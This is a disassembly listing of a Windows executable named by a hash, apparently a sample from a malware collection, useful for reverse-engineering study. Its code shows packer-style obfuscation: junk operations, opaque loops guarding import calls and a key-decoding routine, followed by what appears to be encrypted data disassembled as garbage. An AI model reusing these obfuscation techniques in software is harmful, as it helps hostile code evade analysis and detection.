
e376b395d5715108cb6382a61a43f79f0b24b867145536b7a52698300950c7ef.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d26c
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41fefb
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ff71
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ff91
  401523:	push   0x41fecb
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	(bad)  
  40190d:	push   edi
  40190e:	xchg   ebx,eax
  40190f:	mov    ch,0x62
  401911:	bound  esp,QWORD PTR [edx+0x62]
  401914:	sbb    bl,BYTE PTR [edi+0x62]
  401917:	bound  ecx,QWORD PTR [ecx]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	pop    esi
  401925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x2269a3f1
  4019bd:	mov    ah,0x7f
  4019bf:	push   0xffffff80
  4019c1:	dec    edi
  4019c2:	cdq    
  4019c3:	xchg   edx,eax
  4019c4:	add    eax,0x8faa62f
  4019c9:	sub    BYTE PTR [ebp-0x15],ah
  4019cc:	mov    edi,0x2926f23b
  4019d1:	popa   
  4019d2:	mov    ds:0x18e97086,al
  4019d7:	icebp  
  4019d8:	pop    esp
  4019d9:	mov    WORD PTR [ebp-0x6e5938d1],es
  4019df:	jle    0x401a5f
  4019e1:	push   ds
  4019e2:	dec    ecx
  4019e3:	inc    edx
  4019e4:	jne    0x401a40
  4019e6:	or     al,0xc0
  4019e8:	jnp    0x401996
  4019ea:	cld    
  4019eb:	clc    
  4019ec:	jmp    0xfa58:0xd59df7c6
  4019f3:	cmp    BYTE PTR [ebx],ch
  4019f5:	(bad)  
  4019f6:	adc    edi,DWORD PTR [esi]
  4019f8:	cmp    ecx,DWORD PTR [edx+0x26]
  4019fb:	popf   
  4019fc:	inc    edi
  4019fd:	test   BYTE PTR [ecx-0x33],cl
  401a00:	inc    eax
  401a01:	mov    dh,0x39
  401a03:	sub    DWORD PTR [ebx-0x1b13022c],edi
  401a09:	and    cl,bh
  401a0b:	clc    
  401a0c:	sbb    al,BYTE PTR ss:[ebp+0x15eb99e8]
  401a13:	call   0x1fa257d9
  401a18:	cmp    al,0x63
  401a1a:	mov    dl,0xae
  401a1c:	in     al,0x9
  401a1e:	adc    eax,0x8b0cffe6
  401a23:	ja     0x401a7a
  401a25:	cli    
  401a26:	aas    
  401a27:	push   ecx
  401a28:	hlt    
  401a29:	test   esp,eax
  401a2b:	add    ebp,DWORD PTR [esi]
  401a2d:	sbb    DWORD PTR [ebp-0x3f363f59],ebp
  401a33:	jmp    0x67eab73f
  401a38:	dec    esp
  401a39:	mov    ds:0x6ccdf49a,al
  401a3e:	repz pop eax
  401a40:	jge    0x401a82
  401a42:	cdq    
  401a43:	inc    esi
  401a44:	cdq    
  401a45:	xchg   esi,eax
  401a46:	sbb    al,ah
  401a48:	mov    bl,0x4a
  401a4a:	mov    DWORD PTR [edx+esi*8],esp
  401a4d:	popa   
  401a4e:	shl    cl,1
  401a50:	mov    BYTE PTR [edi+0x5b],bh
  401a53:	out    0xb3,eax
  401a55:	pop    ebx
  401a56:	jb     0x401a01
  401a58:	aas    
  401a59:	ret    0xe91d
  401a5c:	aad    0x9
  401a5e:	jmp    0xd283:0x54ee9e64
  401a65:	cs cmp eax,0x833f69e0
  401a6b:	pop    es
  401a6c:	loopne 0x401a2f
  401a6e:	mov    ebx,0x2eacbcfe
  401a73:	mov    ds:0xae02df13,al
  401a78:	(bad)  
  401a79:	and    esp,DWORD PTR [esi]
  401a7b:	call   0x5988:0x7c68d9c8
  401a82:	cli    
  401a83:	adc    esp,esi
  401a85:	pop    ebx
  401a86:	lea    ebp,[edi]
  401a88:	(bad)  
  401a89:	scas   eax,DWORD PTR es:[edi]
  401a8a:	out    dx,al
  401a8b:	fwait
  401a8c:	jg     0x401abe
  401a8e:	cmp    eax,0x58206185
  401a93:	imul   DWORD PTR [eax*1-0x642d8e9b]
  401a9a:	push   ds
  401a9b:	hlt    
  401a9c:	mov    edx,0xe0b23268
  401aa1:	sar    dl,cl
  401aa3:	lahf   
  401aa4:	sahf   
  401aa5:	jo     0x401b1c
  401aa7:	in     eax,0x8d
  401aa9:	push   cs
  401aaa:	push   es
  401aab:	(bad)  
  401aac:	out    dx,al
  401aad:	(bad)  
